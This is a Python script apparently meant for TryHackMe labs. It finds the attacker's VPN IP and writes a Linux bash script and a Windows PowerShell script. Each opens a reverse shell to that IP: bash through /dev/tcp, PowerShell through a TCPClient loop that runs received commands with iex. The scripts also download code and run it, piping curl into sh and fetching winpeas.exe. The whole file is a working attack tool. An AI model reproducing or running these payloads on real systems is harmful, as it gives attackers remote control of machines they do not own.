#!/usr/bin/env python3
import sys
import socket
import os

def get_attack_ip():
    # Attempting retrieval of TryHackMe VPN interface IP address
    try:
        import netifaces
        if 'tun0' in netifaces.interfaces():
            addrs = netifaces.ifaddresses('tun0')
            return addrs[netifaces.AF_INET][0]['addr']
    except ImportError:
        pass
    
    # Fallback routine: Extracting IP from local routing socket tuple interface
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        # s.getsockname() returns a tuple (IP, Port). Extracting index [0] to ensure correct string formatting.
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"

def generate_payloads(attack_ip, lport):
    print(f"[*] Utilizing Local Network Binding Address: {attack_ip}")
    print(f"[*] Utilizing Specified Listening Port: {lport}")
    
    # Define system deployment paths
    linux_script_path = "deploy_linux.sh"
    windows_script_path = "deploy_windows.ps1"
    
    # 1. Linux Payload Generation Block
    linux_payload = (
        "#!/bin/bash\n"
        f"bash -i >& /dev/tcp/{attack_ip}/{lport} 0>&1 &\n"
        "curl -sL https://github.com | sh\n"
    )
    
    with open(linux_script_path, "w") as f:
        f.write(linux_payload)
    os.chmod(linux_script_path, 0o755)
    print("[+] Linux Deployment Script Ready")
    
    # 2. Windows Payload Generation Block
    windows_payload = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{attack_ip}',{lport});"
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n"
        "iwr https://github.com -OutFile winpeas.exe; .\\winpeas.exe\n"
    )
    
    with open(windows_script_path, "w") as f:
        f.write(windows_payload)
    print("[+] Windows PowerShell Automation Script Ready")
    
    print("[+] Sectumsempra: Payload Generation Complete")

def main():
    if len(sys.argv) < 2:
        print("[-] Usage error. Correct format: python3 sectumsempra.py <LPORT>")
        sys.exit(1)
        
    lport = sys.argv[1]
    attack_ip = get_attack_ip()
    generate_payloads(attack_ip, lport)

if __name__ == "__main__":
    main()
